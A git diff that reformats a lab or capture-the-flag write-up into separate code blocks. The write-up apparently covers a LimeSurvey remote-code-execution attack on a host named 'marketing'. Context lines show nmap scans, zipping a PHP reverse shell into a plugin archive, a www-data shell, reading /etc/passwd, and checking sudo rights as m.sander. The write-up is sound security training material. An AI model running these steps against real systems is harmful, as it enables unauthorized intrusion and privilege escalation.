@@ -20,6 +20,9 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 16.22 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sC -sV -p 22,80                                             
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-27 18:50 UTC
@@ -39,6 +42,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address (1 host up) scanned in 8.38 seconds
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ nmap $IP -sU --top-ports 10
 Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-01-27 18:51 UTC
@@ -171,7 +177,9 @@ I created a `config.xml` and a PHP reverse shell, archived them as a ZIP file.
 └─$ zip wook.zip config.xml php-rev.php 
   adding: config.xml (deflated 56%)
   adding: php-rev.php (deflated 60%)
-                                                                                                                                          
+```
+
+```bash
 ┌──(kali㉿kali)-[~/Desktop/Limesurvey-RCE]
 └─$ unzip -l wook.zip 
 Archive:  wook.zip
@@ -207,6 +215,9 @@ www-data
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 marketing
 www-data@marketing:/$ 
+```
+
+```bash
 www-data@marketing:/home$ ls -R
 .:
 m.sander  t.miller
@@ -217,6 +228,9 @@ ls: cannot open directory './m.sander/personal': Permission denied
 
 ./t.miller:
 local.txt
+```
+
+```bash
 www-data@marketing:/home/t.miller$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -438,6 +452,9 @@ m.sander@marketing:/home/t.miller$ whoami;id;hostname
 m.sander
 uid=1001(m.sander) gid=1001(m.sander) groups=1001(m.sander),24(cdrom),27(sudo),46(plugdev),50(staff),100(users),119(mlocate)
 marketing
+```
+
+```bash
 m.sander@marketing:/home/t.miller$ sudo -l
 [sudo] password for m.sander: 
 Matching Defaults entries for m.sander on marketing:
